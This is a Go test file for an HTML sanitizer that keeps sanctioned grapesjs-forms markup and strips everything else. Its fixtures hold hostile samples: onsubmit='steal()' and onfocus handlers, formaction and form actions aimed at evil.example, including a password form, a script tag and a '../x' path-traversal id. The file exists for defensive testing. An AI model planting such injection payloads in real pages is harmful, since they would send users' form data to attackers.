package render

import (
	"strings"
	"testing"
)

// What grapesjs-forms builds (trimmed), with things a form must not carry.
const formHTML = `<form class="gjsf-form shop" data-gjsf-form="3f2b8c4e-0d6a-4c1e" method="get" action="http://localhost:5174/studio/forms/x" enctype="text/plain" onsubmit="steal()" data-gjsf-success="Thanks!" data-gjsf-codes="{&quot;required&quot;:&quot;Fill it&quot;}">
<div class="gjsf-field gjsf-field--text is-required" data-gjsf-field="name"><label class="gjsf-label" for="gjsf-k-name">Name<span class="gjsf-req" aria-hidden="true">*</span></label>
<input class="gjsf-input" type="text" name="name" id="gjsf-k-name" required minlength="2" placeholder="Your name" onfocus="x()" formaction="https://evil.example/"/><div class="gjsf-error" data-gjsf-error-for="name" aria-live="polite"></div></div>
<input type="hidden" name="src" value="" data-gjsf-value="{{query.utm_source}}"/>
<input type="image" src="https://evil.example/x.png" name="img"/>
<fieldset class="gjsf-field" data-gjsf-field="pick"><legend class="gjsf-label">Pick</legend><label class="gjsf-option"><input class="gjsf-check" type="radio" name="pick" value="1" checked/><span>One</span></label></fieldset>
<select class="gjsf-input" name="topic" multiple><option value="" disabled>—</option><option value="a" selected>A</option></select>
<textarea class="gjsf-input" name="msg" rows="4" maxlength="500">Hi</textarea>
<input type="file" name="cv" accept=".pdf" multiple/>
<input class="gjsf-hp" type="text" name="_gjsf_hp" tabindex="-1" autocomplete="off"/>
<div class="gjsf-actions"><button class="gjsf-submit" type="submit" formaction="https://evil.example/">Send</button></div>
<div class="gjsf-message" role="status"></div>
<script>alert(1)</script>
</form>`

func TestFormsKeptWithLunaForms(t *testing.T) {
	p := Policy{Forms: "https://forms.test/submit/app1/forms/"}
	out, err := SanitizeHTML(formHTML, p)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		`<form class="gjsf-form shop" data-gjsf-form="3f2b8c4e-0d6a-4c1e" method="post" action="https://forms.test/submit/app1/forms/3f2b8c4e-0d6a-4c1e/submissions"`,
		`data-gjsf-codes="{&#34;required&#34;:&#34;Fill it&#34;}"`,
		`<input class="gjsf-input" type="text" name="name" id="gjsf-k-name" required="" minlength="2" placeholder="Your name"/>`,
		`<input type="hidden" name="src" value="" data-gjsf-value="{{query.utm_source}}"/>`,
		`<legend class="gjsf-label">Pick</legend>`, `type="radio" name="pick" value="1" checked=""`,
		`<select class="gjsf-input" name="topic" multiple=""><option value="" disabled="">—</option><option value="a" selected="">A</option></select>`,
		`<textarea class="gjsf-input" name="msg" rows="4" maxlength="500">Hi</textarea>`,
		`<input type="file" name="cv" accept=".pdf" multiple=""/>`,
		`<input class="gjsf-hp" type="text" name="_gjsf_hp" tabindex="-1" autocomplete="off"/>`,
		`<button class="gjsf-submit" type="submit">Send</button>`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %s\nin %s", want, out)
		}
	}
	for _, bad := range []string{"onsubmit", "onfocus", "formaction", "evil.example", "text/plain", "<script", "localhost:5174", `method="get"`} {
		if strings.Contains(out, bad) {
			t.Errorf("kept %q:\n%s", bad, out)
		}
	}
}

func TestFormsDroppedWithoutLunaForms(t *testing.T) {
	out, _ := SanitizeHTML(formHTML, Policy{})
	if strings.Contains(out, "<form") || strings.Contains(out, "<input") || strings.Contains(out, "<select") || strings.Contains(out, "<textarea") {
		t.Fatal(out)
	}
	if !strings.Contains(out, "Name") || !strings.Contains(out, "Send") {
		t.Fatal("the form's text should stay:", out)
	}
	// Other forms (no data-gjsf-form, a bad id), and inputs outside a form.
	p := Policy{Forms: "https://forms.test/submit/app1/forms/"}
	for _, src := range []string{
		`<form action="https://evil.example/"><input name="pw" type="password"></form>`,
		`<form data-gjsf-form="../x" action="/x"><input name="a"></form>`,
		`<div><input name="a"><select name="s"><option>1</option></select></div>`,
	} {
		out, _ := SanitizeHTML(src, p)
		if strings.Contains(out, "<form") || strings.Contains(out, "<input") || strings.Contains(out, "<select") {
			t.Errorf("%s → %s", src, out)
		}
	}
	// A form inside a form is unwrapped, its inputs stay in the outer one.
	out, _ = SanitizeHTML(`<form data-gjsf-form="a"><form data-gjsf-form="b"><input name="x"></form></form>`, p)
	if strings.Count(out, "<form") != 1 || !strings.Contains(out, `<input name="x"/>`) {
		t.Fatal(out)
	}
}
